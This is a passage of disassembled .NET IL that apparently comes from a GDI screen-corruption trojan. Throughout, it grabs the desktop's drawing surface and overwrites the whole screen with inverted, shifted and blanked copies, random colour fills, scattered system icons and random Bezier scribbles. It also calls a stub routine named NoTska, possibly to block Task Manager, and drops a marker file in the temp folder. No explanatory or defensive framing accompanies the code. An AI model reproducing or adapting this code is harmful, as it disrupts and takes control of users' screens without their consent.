      IL_0bff:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c04:  stloc.s    V_19
      IL_0c06:  ldloca.s   V_19
      IL_0c08:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0c0d:  stloc.s    V_22
      IL_0c0f:  ldloc.s    V_20
      IL_0c11:  ldloc.s    V_21
      IL_0c13:  ldc.i4.0
      IL_0c14:  ldc.i4.0
      IL_0c15:  ldloc.s    V_21
      IL_0c17:  sub.ovf
      IL_0c18:  ldloc.s    V_22
      IL_0c1a:  ldloc.s    V_20
      IL_0c1c:  ldc.i4.0
      IL_0c1d:  ldc.i4.0
      IL_0c1e:  ldloc.s    V_21
      IL_0c20:  ldloc.s    V_22
      IL_0c22:  ldc.i4     0xcc0020
      IL_0c27:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0c2c:  pop
      IL_0c2d:  br         IL_1b0b

      IL_0c32:  call       native int j.OK::GetDesktopWindow()
      IL_0c37:  call       native int j.OK::GetWindowDC(native int)
      IL_0c3c:  stloc.s    V_23
      IL_0c3e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c43:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c48:  stloc.s    V_19
      IL_0c4a:  ldloca.s   V_19
      IL_0c4c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0c51:  stloc.s    V_24
      IL_0c53:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c58:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c5d:  stloc.s    V_19
      IL_0c5f:  ldloca.s   V_19
      IL_0c61:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0c66:  stloc.s    V_25
      IL_0c68:  ldloc.s    V_23
      IL_0c6a:  ldc.i4.0
      IL_0c6b:  ldc.i4.0
      IL_0c6c:  ldloc.s    V_24
      IL_0c6e:  ldloc.s    V_25
      IL_0c70:  ldloc.s    V_23
      IL_0c72:  ldc.i4.0
      IL_0c73:  ldc.i4.0
      IL_0c74:  ldloc.s    V_24
      IL_0c76:  ldloc.s    V_25
      IL_0c78:  ldc.i4     0x330008
      IL_0c7d:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0c82:  pop
      IL_0c83:  br         IL_1b0b

      IL_0c88:  call       native int j.OK::GetDesktopWindow()
      IL_0c8d:  call       native int j.OK::GetWindowDC(native int)
      IL_0c92:  stloc.s    V_26
      IL_0c94:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c99:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c9e:  stloc.s    V_19
      IL_0ca0:  ldloca.s   V_19
      IL_0ca2:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0ca7:  stloc.s    V_27
      IL_0ca9:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0cae:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0cb3:  stloc.s    V_19
      IL_0cb5:  ldloca.s   V_19
      IL_0cb7:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0cbc:  stloc.s    V_28
      IL_0cbe:  ldloc.s    V_26
      IL_0cc0:  ldc.i4.0
      IL_0cc1:  ldc.i4.0
      IL_0cc2:  ldloc.s    V_27
      IL_0cc4:  ldloc.s    V_28
      IL_0cc6:  ldloc.s    V_26
      IL_0cc8:  ldc.i4.0
      IL_0cc9:  ldc.i4.0
      IL_0cca:  ldloc.s    V_27
      IL_0ccc:  ldloc.s    V_28
      IL_0cce:  ldc.i4     0xff0062
      IL_0cd3:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0cd8:  pop
      IL_0cd9:  br         IL_1b0b

      IL_0cde:  call       native int j.OK::GetDesktopWindow()
      IL_0ce3:  call       native int j.OK::GetWindowDC(native int)
      IL_0ce8:  stloc.s    V_29
      IL_0cea:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0cef:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0cf4:  stloc.s    V_19
      IL_0cf6:  ldloca.s   V_19
      IL_0cf8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0cfd:  stloc.s    V_30
      IL_0cff:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d04:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d09:  stloc.s    V_19
      IL_0d0b:  ldloca.s   V_19
      IL_0d0d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0d12:  stloc.s    V_31
      IL_0d14:  ldloc.s    V_29
      IL_0d16:  ldc.i4.0
      IL_0d17:  ldc.i4.0
      IL_0d18:  ldloc.s    V_30
      IL_0d1a:  ldloc.s    V_31
      IL_0d1c:  ldloc.s    V_29
      IL_0d1e:  ldc.i4.0
      IL_0d1f:  ldc.i4.0
      IL_0d20:  ldloc.s    V_30
      IL_0d22:  ldloc.s    V_31
      IL_0d24:  ldc.i4.s   66
      IL_0d26:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0d2b:  pop
      IL_0d2c:  br         IL_1b0b

      IL_0d31:  call       native int j.OK::GetDesktopWindow()
      IL_0d36:  call       native int j.OK::GetWindowDC(native int)
      IL_0d3b:  stloc.s    V_32
      IL_0d3d:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d42:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d47:  stloc.s    V_19
      IL_0d49:  ldloca.s   V_19
      IL_0d4b:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0d50:  stloc.s    V_33
      IL_0d52:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0d57:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0d5c:  stloc.s    V_19
      IL_0d5e:  ldloca.s   V_19
      IL_0d60:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0d65:  stloc.s    V_34
      IL_0d67:  ldloc.s    V_32
      IL_0d69:  ldc.i4.s   25
      IL_0d6b:  ldc.i4.s   25
      IL_0d6d:  ldloc.s    V_33
      IL_0d6f:  ldc.i4.s   50
      IL_0d71:  sub.ovf
      IL_0d72:  ldloc.s    V_34
      IL_0d74:  ldc.i4.s   50
      IL_0d76:  sub.ovf
      IL_0d77:  ldloc.s    V_32
      IL_0d79:  ldc.i4.0
      IL_0d7a:  ldc.i4.0
      IL_0d7b:  ldloc.s    V_33
      IL_0d7d:  ldloc.s    V_34
      IL_0d7f:  ldc.i4     0xcc0020
      IL_0d84:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0d89:  pop
      IL_0d8a:  br         IL_1b0b

      IL_0d8f:  ldstr      "on"
      IL_0d94:  stsfld     string j.OK::NTTA
      IL_0d99:  call       void Stub.NoTska::Start()
      IL_0d9e:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0da3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0da8:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0dad:  ldstr      "select.dat"
      IL_0db2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0db7:  ldc.i4.1
      IL_0db8:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                       bool)
      IL_0dbd:  dup
      IL_0dbe:  ldstr      "002"
      IL_0dc3:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0dc8:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      .try
      {
        IL_0dcd:  newobj     instance void Form1::.ctor()
        IL_0dd2:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_0dd7:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ddc:  dup
        IL_0ddd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0de2:  stloc.s    V_35
        IL_0de4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0de9:  leave      IL_1b0b

      }  // end handler
      IL_0dee:  ldstr      "Love"
      IL_0df3:  stsfld     string j.OK::NTTA
      .try
      {
        IL_0df8:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0dfd:  ldstr      "select.dat"
        IL_0e02:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0e07:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_0e0c:  brfalse.s  IL_0e22

        IL_0e0e:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0e13:  ldstr      "select.dat"
        IL_0e18:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0e1d:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0e22:  leave      IL_1b0b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e27:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e2c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e31:  leave      IL_1b0b

      }  // end handler
      IL_0e36:  call       native int j.OK::GetDesktopWindow()
      IL_0e3b:  call       native int j.OK::GetWindowDC(native int)
      IL_0e40:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0e45:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0e4a:  stloc.s    V_19
      IL_0e4c:  ldloca.s   V_19
      IL_0e4e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0e53:  stloc.s    V_36
      IL_0e55:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0e5a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0e5f:  stloc.s    V_19
      IL_0e61:  ldloca.s   V_19
      IL_0e63:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0e68:  stloc.s    V_37
      IL_0e6a:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0e6f:  ldc.i4.0
      IL_0e70:  ldc.i4     0x1000000
      IL_0e75:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_0e7a:  conv.ovf.u4
      IL_0e7b:  call       native int j.OK::CreateSolidBrush(uint32)
      IL_0e80:  stloc.s    V_38
      IL_0e82:  dup
      IL_0e83:  ldloc.s    V_38
      IL_0e85:  call       native int j.OK::SelectObject(native int,
                                                         native int)
      IL_0e8a:  pop
      IL_0e8b:  ldc.i4.0
      IL_0e8c:  ldc.i4.0
      IL_0e8d:  ldloc.s    V_36
      IL_0e8f:  ldloc.s    V_37
      IL_0e91:  ldc.i4     0x5a0049
      IL_0e96:  call       bool j.OK::PatBlt(native int,
                                             int32,
                                             int32,
                                             int32,
                                             int32,
                                             valuetype j.OK/TernaryRasterOperations)
      IL_0e9b:  pop
      IL_0e9c:  ldloc.s    V_38
      IL_0e9e:  call       bool j.OK::DeleteObject(native int)
      IL_0ea3:  pop
      IL_0ea4:  br         IL_1b0b

      IL_0ea9:  call       native int j.OK::GetDesktopWindow()
      IL_0eae:  stloc.s    V_39
      IL_0eb0:  ldloc.s    V_39
      IL_0eb2:  call       native int j.OK::GetWindowDC(native int)
      IL_0eb7:  stloc.s    V_40
      IL_0eb9:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0ebe:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0ec3:  stloc.s    V_19
      IL_0ec5:  ldloca.s   V_19
      IL_0ec7:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0ecc:  stloc.s    V_41
      IL_0ece:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0ed3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0ed8:  stloc.s    V_19
      IL_0eda:  ldloca.s   V_19
      IL_0edc:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0ee1:  stloc.s    V_42
      IL_0ee3:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0ee8:  stloc.s    V_43
      IL_0eea:  ldc.i4.0
      IL_0eeb:  stloc.s    V_44
      IL_0eed:  ldloc.s    V_43
      IL_0eef:  ldc.i4.6
      IL_0ef0:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0ef5:  stloc.s    V_50
      IL_0ef7:  ldloc.s    V_50
      IL_0ef9:  switch     ( 
                            IL_0f18,
                            IL_0f21,
                            IL_0f2a,
                            IL_0f33,
                            IL_0f3c,
                            IL_0f45)
      IL_0f16:  br.s       IL_0f4c

      IL_0f18:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Error()
      IL_0f1d:  stloc.s    V_45
      IL_0f1f:  br.s       IL_0f4c

      IL_0f21:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Warning()
      IL_0f26:  stloc.s    V_45
      IL_0f28:  br.s       IL_0f4c

      IL_0f2a:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Information()
      IL_0f2f:  stloc.s    V_45
      IL_0f31:  br.s       IL_0f4c

      IL_0f33:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_WinLogo()
      IL_0f38:  stloc.s    V_45
      IL_0f3a:  br.s       IL_0f4c

      IL_0f3c:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Shield()
      IL_0f41:  stloc.s    V_45
      IL_0f43:  br.s       IL_0f4c

      IL_0f45:  call       class [System.Drawing]System.Drawing.Icon [System.Drawing]System.Drawing.SystemIcons::get_Application()
      IL_0f4a:  stloc.s    V_45
      IL_0f4c:  ldloc.s    V_45
      IL_0f4e:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Width()
      IL_0f53:  stloc.s    V_46
      IL_0f55:  ldloc.s    V_45
      IL_0f57:  callvirt   instance int32 [System.Drawing]System.Drawing.Icon::get_Height()
      IL_0f5c:  stloc.s    V_47
      IL_0f5e:  ldloc.s    V_43
      IL_0f60:  ldloc.s    V_41
      IL_0f62:  ldloc.s    V_46
      IL_0f64:  sub.ovf
      IL_0f65:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0f6a:  stloc.s    V_48
      IL_0f6c:  ldloc.s    V_43
      IL_0f6e:  ldloc.s    V_42
      IL_0f70:  ldloc.s    V_47
      IL_0f72:  sub.ovf
      IL_0f73:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0f78:  stloc.s    V_49
      IL_0f7a:  ldloc.s    V_40
      IL_0f7c:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_0f81:  dup
      IL_0f82:  ldloc.s    V_45
      IL_0f84:  ldloc.s    V_48
      IL_0f86:  ldloc.s    V_49
      IL_0f88:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawIcon(class [System.Drawing]System.Drawing.Icon,
                                                                                           int32,
                                                                                           int32)
      IL_0f8d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0f92:  ldloc.s    V_44
      IL_0f94:  ldc.i4.1
      IL_0f95:  add.ovf
      IL_0f96:  stloc.s    V_44
      IL_0f98:  ldloc.s    V_44
      IL_0f9a:  ldc.i4.s   10
      IL_0f9c:  ble        IL_0eed

      IL_0fa1:  ldloc.s    V_39
      IL_0fa3:  ldloc.s    V_40
      IL_0fa5:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_0faa:  pop
      IL_0fab:  br         IL_1b0b

      IL_0fb0:  call       native int j.OK::GetDesktopWindow()
      IL_0fb5:  stloc.s    V_51
      IL_0fb7:  ldloc.s    V_51
      IL_0fb9:  call       native int j.OK::GetWindowDC(native int)
      IL_0fbe:  stloc.s    V_52
      IL_0fc0:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0fc5:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0fca:  stloc.s    V_19
      IL_0fcc:  ldloca.s   V_19
      IL_0fce:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0fd3:  stloc.s    V_53
      IL_0fd5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0fda:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0fdf:  stloc.s    V_19
      IL_0fe1:  ldloca.s   V_19
      IL_0fe3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0fe8:  stloc.s    V_54
      IL_0fea:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_0fef:  ldc.r4     10.
      IL_0ff4:  newobj     instance void [System.Drawing]System.Drawing.Pen::.ctor(valuetype [System.Drawing]System.Drawing.Color,
                                                                                   float32)
      IL_0ff9:  stloc.s    V_55
      IL_0ffb:  ldloc.s    V_55
      IL_0ffd:  ldc.i4.2
      IL_0ffe:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_StartCap(valuetype [System.Drawing]System.Drawing.Drawing2D.LineCap)
      IL_1003:  ldloc.s    V_55
      IL_1005:  ldc.i4.2
      IL_1006:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_EndCap(valuetype [System.Drawing]System.Drawing.Drawing2D.LineCap)
      IL_100b:  ldloc.s    V_52
      IL_100d:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_1012:  stloc.s    V_56
      IL_1014:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
      IL_1019:  stloc.s    V_57
      IL_101b:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_1020:  stloc.s    V_58
      IL_1022:  ldloc.s    V_57
      IL_1024:  ldloc.s    V_58
      IL_1026:  ldloc.s    V_53
      IL_1028:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_102d:  ldloc.s    V_58
      IL_102f:  ldloc.s    V_54
      IL_1031:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1036:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_103b:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
      IL_1040:  ldc.i4.1
      IL_1041:  stloc.s    V_59
      IL_1043:  ldloc.s    V_58
      IL_1045:  ldc.i4     0x100
      IL_104a:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_104f:  ldloc.s    V_58
      IL_1051:  ldc.i4     0x100
      IL_1056:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_105b:  ldloc.s    V_58
      IL_105d:  ldc.i4     0x100
      IL_1062:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1067:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         int32,
                                                                                                                         int32)
      IL_106c:  stloc.s    V_60
      IL_106e:  ldloc.s    V_55
      IL_1070:  ldloc.s    V_60
      IL_1072:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_Color(valuetype [System.Drawing]System.Drawing.Color)
      IL_1077:  ldloc.s    V_55
      IL_1079:  ldc.r4     15.
      IL_107e:  callvirt   instance void [System.Drawing]System.Drawing.Pen::set_Width(float32)
      IL_1083:  ldloc.s    V_57
      IL_1085:  ldloc.s    V_59
      IL_1087:  ldc.i4.1
      IL_1088:  sub.ovf
      IL_1089:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_108e:  stloc.s    V_66
      IL_1090:  ldloca.s   V_66
      IL_1092:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_1097:  ldloc.s    V_58
      IL_1099:  ldc.i4.s   -50
      IL_109b:  ldc.i4.s   51
      IL_109d:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_10a2:  add.ovf
      IL_10a3:  stloc.s    V_61
      IL_10a5:  ldloc.s    V_57
      IL_10a7:  ldloc.s    V_59
      IL_10a9:  ldc.i4.1
      IL_10aa:  sub.ovf
      IL_10ab:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_10b0:  stloc.s    V_66
      IL_10b2:  ldloca.s   V_66
      IL_10b4:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_10b9:  ldloc.s    V_58
      IL_10bb:  ldc.i4.s   -50
      IL_10bd:  ldc.i4.s   51
      IL_10bf:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_10c4:  add.ovf
      IL_10c5:  stloc.s    V_62
      IL_10c7:  ldloc.s    V_57
      IL_10c9:  ldloc.s    V_59
      IL_10cb:  ldc.i4.1
      IL_10cc:  sub.ovf
      IL_10cd:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_10d2:  stloc.s    V_66
      IL_10d4:  ldloca.s   V_66
      IL_10d6:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_10db:  ldloc.s    V_58
      IL_10dd:  ldc.i4.s   -50
      IL_10df:  ldc.i4.s   51
      IL_10e1:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_10e6:  add.ovf
      IL_10e7:  stloc.s    V_63
      IL_10e9:  ldloc.s    V_57
      IL_10eb:  ldloc.s    V_59
      IL_10ed:  ldc.i4.1
      IL_10ee:  sub.ovf
      IL_10ef:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_10f4:  stloc.s    V_66
      IL_10f6:  ldloca.s   V_66
      IL_10f8:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_10fd:  ldloc.s    V_58
      IL_10ff:  ldc.i4.s   -50
      IL_1101:  ldc.i4.s   51
      IL_1103:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_1108:  add.ovf
      IL_1109:  stloc.s    V_64
      IL_110b:  ldloc.s    V_58
      IL_110d:  ldloc.s    V_53
      IL_110f:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_1114:  ldloc.s    V_58
      IL_1116:  ldloc.s    V_54
      IL_1118:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_111d:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_1122:  stloc.s    V_65
      IL_1124:  ldloc.s    V_57
      IL_1126:  ldloc.s    V_65
      IL_1128:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
      IL_112d:  ldloc.s    V_56
      IL_112f:  ldloc.s    V_55
      IL_1131:  ldloc.s    V_57
      IL_1133:  ldloc.s    V_59
      IL_1135:  ldc.i4.1
      IL_1136:  sub.ovf
      IL_1137:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_113c:  ldloc.s    V_61
      IL_113e:  ldloc.s    V_62
      IL_1140:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_1145:  ldloc.s    V_63
      IL_1147:  ldloc.s    V_64
      IL_1149:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_114e:  ldloc.s    V_65
      IL_1150:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawBezier(class [System.Drawing]System.Drawing.Pen,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                             valuetype [System.Drawing]System.Drawing.Point)
      IL_1155:  ldloc.s    V_59
      IL_1157:  ldc.i4.1
      IL_1158:  add.ovf
      IL_1159:  stloc.s    V_59
      IL_115b:  ldloc.s    V_59
      IL_115d:  ldc.i4.s   99
      IL_115f:  ble        IL_1043

      IL_1164:  ldloc.s    V_55
      IL_1166:  callvirt   instance void [System.Drawing]System.Drawing.Pen::Dispose()
      IL_116b:  ldloc.s    V_56
      IL_116d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1172:  ldloc.s    V_51
      IL_1174:  ldloc.s    V_52
      IL_1176:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_117b:  pop
      IL_117c:  br         IL_1b0b

      IL_1181:  call       native int j.OK::GetDesktopWindow()
      IL_1186:  stloc.s    V_67
      IL_1188:  ldloc.s    V_67
      IL_118a:  call       native int j.OK::GetWindowDC(native int)
      IL_118f:  stloc.s    V_68
      IL_1191:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1196:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_119b:  stloc.s    V_19
      IL_119d:  ldloca.s   V_19
      IL_119f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_11a4:  stloc.s    V_69
      IL_11a6:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_11ab:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_11b0:  stloc.s    V_19
      IL_11b2:  ldloca.s   V_19
      IL_11b4:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_11b9:  stloc.s    V_70
      IL_11bb:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_11c0:  stloc.s    V_71
      IL_11c2:  ldc.i4.0
      IL_11c3:  stloc.s    V_72
      IL_11c5:  ldloc.s    V_71
